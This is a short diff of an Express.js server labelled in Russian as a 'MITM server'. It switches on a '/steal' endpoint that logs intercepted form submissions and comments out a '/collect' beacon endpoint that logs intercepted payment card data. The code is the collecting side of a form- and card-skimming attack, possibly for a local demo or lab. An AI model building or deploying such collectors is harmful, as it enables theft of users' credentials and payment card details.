@@ -19,24 +19,24 @@ app.use((req, res, next) => {
 app.use(express.static(path.join(__dirname, "public")));
 
 // пример перехвата данных формы
-/*app.post("/steal", (req, res) => {
+app.post("/steal", (req, res) => {
     console.log("🔥 Перехваченные данные формы:", req.body);
     res.send({ status: "ok" });
-});*/
-
-app.post("/collect", express.raw({ type: '*/*' }), (req, res) => {
-    try {
-        const data = JSON.parse(req.body.toString());
-        console.log("📊 Собранная аналитика (с перехватом):", data);
-        if (data.payment_attempt) {
-            console.log("🔥🔥🔥 ПЕРЕХВАЧЕНЫ ДАННЫЕ КАРТЫ:", data.payment_attempt);
-        }
-        res.status(204).end(); // No Content — типично для beacon
-    } catch (e) {
-        console.log("Ошибка парсинга:", e.message);
-        res.status(400).end();
-    }
 });
+
+// app.post("/collect", express.raw({ type: '*/*' }), (req, res) => {
+//     try {
+//         const data = JSON.parse(req.body.toString());
+//         console.log("📊 Собранная аналитика (с перехватом):", data);
+//         if (data.payment_attempt) {
+//             console.log("🔥🔥🔥 ПЕРЕХВАЧЕНЫ ДАННЫЕ КАРТЫ:", data.payment_attempt);
+//         }
+//         res.status(204).end(); // No Content — типично для beacon
+//     } catch (e) {
+//         console.log("Ошибка парсинга:", e.message);
+//         res.status(400).end();
+//     }
+// });
 
 app.listen(PORT, () => {
     console.log(`MITM-сервер запущен → http://localhost:${PORT}`);
